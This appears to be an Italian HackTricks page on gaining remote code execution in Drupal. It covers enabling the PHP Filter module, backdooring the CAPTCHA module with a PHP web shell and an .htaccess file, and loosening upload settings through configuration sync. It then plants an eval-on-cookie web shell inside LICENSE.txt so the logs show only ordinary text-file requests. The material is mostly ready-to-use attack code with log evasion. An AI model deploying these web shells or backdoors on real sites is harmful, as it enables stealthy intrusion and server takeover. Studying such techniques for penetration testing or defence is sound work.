# Drupal RCE

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Con il Modulo PHP Filter

{% hint style="warning" %}
Nelle versioni precedenti di Drupal **(prima della versione 8)**, era possibile accedere come amministratore e **abilitare il modulo `PHP filter`**, che "Consente di valutare codice/frammenti PHP incorporati." Ma dalla versione 8 questo modulo non √® installato per impostazione predefinita.
{% endhint %}

√à necessario che il **plugin php sia installato** (verifica accedendo a _/modules/php_ e se restituisce un **403** allora, **esiste**, se **non trovato**, allora il **plugin php non √® installato**)

Vai su _Moduli_ -> (**Controlla**) _PHP Filter_ -> _Salva configurazione_

![](<../../../.gitbook/assets/image (247) (1).png>)

Quindi clicca su _Aggiungi contenuto_ -> Seleziona _Pagina di base_ o _Articolo_ -> Scrivi _shellcode php nel corpo_ -> Seleziona _Codice PHP_ in _Formato testo_ -> Seleziona _Anteprima_

![](<../../../.gitbook/assets/image (338).png>)

Infine accedi semplicemente al nodo appena creato:
```bash
curl http://drupal-site.local/node/3
```
## Installare il Modulo Filtro PHP

{% hint style="warning" %}
Nelle versioni attuali non √® pi√π possibile installare plugin avendo accesso solo al web dopo l'installazione predefinita.
{% endhint %}

Dalla versione **8 in poi, il** [**modulo Filtro PHP**](https://www.drupal.org/project/php/releases/8.x-1.1) **non √® pi√π installato per impostazione predefinita**. Per sfruttare questa funzionalit√†, dovremmo **installare il modulo noi stessi**.

1. Scaricare la versione pi√π recente del modulo dal sito web di Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Una volta scaricato, andare su **`Amministrazione`** > **`Report`** > **`Aggiornamenti disponibili`**.
3. Fare clic su **`Sfoglia`**, selezionare il file dalla directory in cui lo abbiamo scaricato e poi fare clic su **`Installa`**.
4. Una volta installato il modulo, possiamo fare clic su **`Contenuto`** e **creare una nuova pagina di base**, simile a quanto fatto nell'esempio di Drupal 7. Di nuovo, assicurarsi di **selezionare `Codice PHP` dal menu a discesa `Formato testo`**.

## Modulo con Backdoor

{% hint style="warning" %}
Nelle versioni attuali non √® pi√π possibile installare plugin avendo accesso solo al web dopo l'installazione predefinita.
{% endhint %}

Un modulo con backdoor pu√≤ essere creato **aggiungendo una shell a un modulo esistente**. I moduli possono essere trovati sul sito drupal.org. Scegliamo un modulo come [CAPTCHA](https://www.drupal.org/project/captcha). Scorri verso il basso e copia il link per l'**archivio tar.gz** [archivio](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Scaricare l'archivio ed estrarne i contenuti.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Creare una **shell web PHP** con il contenuto:
```php
<?php
system($_GET["cmd"]);
?>
```
* Successivamente, dobbiamo creare un file **`.htaccess`** per darci accesso alla cartella. Questo √® necessario poich√© Drupal nega l'accesso diretto alla cartella **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* La configurazione sopra applicher√† le regole per la cartella / quando richiediamo un file in /modules. Copia entrambi questi file nella cartella captcha e crea un archivio.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Presumendo di avere **accesso amministrativo** al sito web, fare clic su **`Gestisci`** e poi su **`Estendi`** nella barra laterale. Successivamente, fare clic sul pulsante **`+ Installa nuovo modulo`**, e saremo portati alla pagina di installazione, come ad esempio `http://sito-drupal.locale/admin/moduli/installa`. Navigare nell'archivio Captcha backdoored e fare clic su **`Installa`**.
* Una volta completata l'installazione, navigare a **`/moduli/captcha/shell.php`** per eseguire comandi.

## Backdooring Drupal con la sincronizzazione della configurazione <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Post condiviso da** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Parte 1 (attivazione di _Media_ e _Media Library_)

Nel menu _Estendi_ (/admin/moduli), √® possibile attivare ci√≤ che sembrano essere plugin gi√† installati. Di default, i plugin _Media_ e _Media Library_ non sembrano essere attivati, quindi attiviamoli.

Prima dell'attivazione:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Dopo l'attivazione:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Parte 2 (sfruttare la funzionalit√† _Sincronizzazione della configurazione_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Sfrutteremo la funzionalit√† _Sincronizzazione della configurazione_ per esportare e importare voci di configurazione di Drupal:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Patch system.file.yml**

Iniziamo applicando la patch alla prima voce `allow_insecure_uploads` da:

File: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

A:

File: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Applica la patch al campo field.field.media.document.field\_media\_document.yml**

Successivamente, applica la patch alla seconda voce `file_extensions` da:

File: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

A:

File: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Non lo uso in questo post del blog ma √® noto che √® possibile definire l'ingresso `file_directory` in modo arbitrario ed √® vulnerabile a un attacco di attraversamento del percorso (quindi possiamo tornare indietro all'interno dell'albero del filesystem di Drupal).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Parte 3 (sfruttando la funzionalit√† _Aggiungi documento_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

L'ultimo passo √® il pi√π semplice, ed √® suddiviso in due sotto-passaggi. Il primo consiste nel caricare un file in formato .htaccess per sfruttare le direttive di Apache e consentire ai file .txt di essere interpretati dal motore PHP. Il secondo √® caricare un file .txt contenente il nostro payload.

File: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Perch√© √® figo questo trucco?

Perch√© una volta che il Webshell (che chiameremo LICENSE.txt) √® stato caricato sul server Web, possiamo trasmettere i nostri comandi tramite `$_COOKIE` e nei log del server Web, questo verr√† visualizzato come una richiesta GET legittima a un file di testo.

Perch√© chiamare il nostro Webshell LICENSE.txt?

Semplicemente perch√© se prendiamo il seguente file, ad esempio [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (che √® gi√† presente nel core di Drupal), abbiamo un file di 339 righe e 17,6 KB di dimensioni, perfetto per aggiungere un piccolo snippet di codice PHP in mezzo (dato che il file √® abbastanza grande).

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

File: LICENSE.txt Patchato
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Parte 3.1 (caricamento file .htaccess)**

Innanzitutto, sfruttiamo la funzionalit√† _Aggiungi documento_ (/media/add/document) per caricare il nostro file contenente le direttive Apache (.htaccess).

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Parte 3.2 (caricamento file LICENSE.txt)**

Successivamente, sfruttiamo nuovamente la funzionalit√† _Aggiungi documento_ (/media/add/document) per caricare un Webshell nascosto all'interno di un file di licenza.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Parte 4 (interazione con il Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

L'ultima parte consiste nell'interagire con il Webshell.

Come mostrato nello screenshot seguente, se il cookie atteso dal nostro Webshell non √® definito, otteniamo il risultato successivo quando consultiamo il file tramite un browser Web.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Quando l'attaccante imposta il cookie, pu√≤ interagire con il Webshell ed eseguire qualsiasi comando desideri.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

E come puoi vedere nei log, sembra che sia stato richiesto solo un file txt.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Grazie per aver dedicato del tempo a leggere questo articolo, spero che ti aiuti a ottenere delle shell.
